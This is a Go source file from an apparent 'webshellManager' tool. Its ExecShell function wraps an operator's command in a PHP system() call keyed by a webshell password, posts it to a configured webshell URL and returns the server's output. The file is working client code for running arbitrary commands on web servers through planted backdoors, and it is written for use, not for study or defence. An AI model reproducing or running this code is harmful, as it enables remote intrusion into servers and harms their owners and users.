// Package shell shell.go
package shell

import (
	"fmt"
	"io"
	"webshellManager/database"
	"webshellManager/http"
	"webshellManager/util"
)

func ExecShell(payload string) (*string, error) {
	database.SelectDb()
	shellPayload := fmt.Sprintf("%s=system('%s');", util.Passwd, payload)
	respShell, err := http.MakeRequest(shellPayload, util.HttpURL, util.UserAgent)
	{
		util.HandleError(err, "请求执行系统命令失败")
	}
	defer func(body io.ReadCloser) {
		err := body.Close()
		{
			util.HandleError(err, "关闭响应失败")
		}
	}(respShell.Body)

	bodyShell, err := io.ReadAll(respShell.Body)
	{
		util.HandleError(err, "读取响应体失败")
	}
	bodyresp := string(bodyShell)
	if bodyresp != "" {
		fmt.Println("执行系统命令响应:")
		//fmt.Printf("%s", bodyShell)
	}
	return &bodyresp, nil
}
